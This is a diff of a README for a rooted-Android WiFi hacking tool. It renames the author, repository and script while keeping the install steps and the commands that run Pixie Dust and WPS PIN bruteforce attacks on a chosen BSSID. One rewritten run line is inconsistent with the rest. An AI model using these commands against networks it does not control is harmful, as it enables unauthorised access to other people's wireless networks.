@@ -1,5 +1,5 @@
 
-<h1 align="center">🆉🅰🅷🅸🅳 🅷🅰🆂🅰🅽</h1>
+<h1 align="center">Knownrdx</h1>
 <h4 align="center">Hack WIfi Using Termux! (Requires Root)</h4>
 
 ### Installation :
@@ -11,24 +11,24 @@
 • pkg install python2
 • pkg install root-repo -y
 • pkg install git tsu python wpa-supplicant pixiewps iw -y
-• git clone https://github.com/zahidnu0/iamzahidbd.git 
-• cd iamzahidbd 
+• git clone https://github.com/knownrdx/wifi.git
+• cd wifi 
 • pip3 install -r requirements.txt
-• chmod +x iamzahidbd.py
-• sudo python iamzahidbd.py -i wlan0 -K
+• chmod +x wifi.py
+• sudo python wifi -i wlan0 -K
 ```
-#### Help : `sudo python iamzahidbd.py --help`
-#### Example : `sudo python iamzahidbd.py -i wlan0 -K`
+#### Help : `sudo python wifi.py --help`
+#### Example : `sudo python wifi.py -i wlan0 -K`
 
 #### Note: 
 + **First turn off your Wifi.**
 + **Turn on Hotspot.**
 - Show avaliable networks and start Pixie Dust attack on a specified network.
-- `sudo python iamzahidbd.py -i wlan0 -K`
+- `sudo python wifi.py -i wlan0 -K`
 - - Start Pixie Dust attack on a specified BSSID:
-`sudo python iamzahidbd.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
+`sudo python wifi.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
 - Launch online WPS bruteforce with the specified first half of the PIN:
-- `sudo python iamzahidbd.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
+- `sudo python wifi.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
 ### Troubleshooting
 **"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**
 
@@ -37,7 +37,7 @@
 ````
 🆉🅰🅷🅸🅳 🅷🅰🆂🅰🅽 (License)
 
-Copyright (c) 2024 🆉🅰🅷🅸🅳 🅷🅰🆂🅰🅽
+Copyright (c) 2024 knownrdx
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
